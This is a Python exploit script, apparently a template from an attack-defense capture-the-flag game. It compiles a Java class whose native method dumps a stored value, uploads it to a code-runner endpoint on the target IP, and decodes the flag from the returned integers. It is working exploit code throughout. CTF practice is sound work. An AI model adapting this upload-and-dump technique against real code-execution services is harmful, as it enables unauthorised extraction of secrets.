#!/usr/bin/env python3
import os
import random
import re
import subprocess
from string import ascii_letters
import json

import requests


# Some helper functions
def rand_str(len=12):
    return "".join(random.choices(ascii_letters, k=len))


def compile_java(java_file):
    subprocess.run(["/usr/bin/javac", java_file])


# Exploit goes here:
IP = os.environ["IP"]
FLAG_STORES = json.loads(os.getenv("FLAG_ID", "[]"))

# ----- EXAMPLE EXPLOIT BELOW, REMOVE IT -----

FLAG_ID = FLAG_STORES["0"][0]  # extract the flagid we want from the json object

CLASS_NAME = rand_str()

# exploit code to compile
java_file = f"""class {FLAG_ID}
{{
    static native void dump();
}}

class {CLASS_NAME} {{
public static void main(String[] args) {{
    {FLAG_ID}.dump();
}}
}}"""

with open(f"{CLASS_NAME}.java", "w") as f:
    f.write(java_file)

compile_java(f"{CLASS_NAME}.java")

res = requests.post(
    f"http://{IP}:3165/runner.php",
    files={"fileToUpload": open(f"{CLASS_NAME}.class", "rb")},
    timeout=5,
).text

# cleanup
os.remove(f"./{FLAG_ID}.class")
os.remove(f"./{CLASS_NAME}.class")
os.remove(f"./{CLASS_NAME}.java")

# parse and extract flag
nums = [int(x) for x in re.findall(r"C_Integer ([0-9]+)l", res)[1:]]
flag = b"".join(bytes.fromhex(hex(x)[2:]) for x in nums).replace(b"\x00", b"")

print(flag.decode())
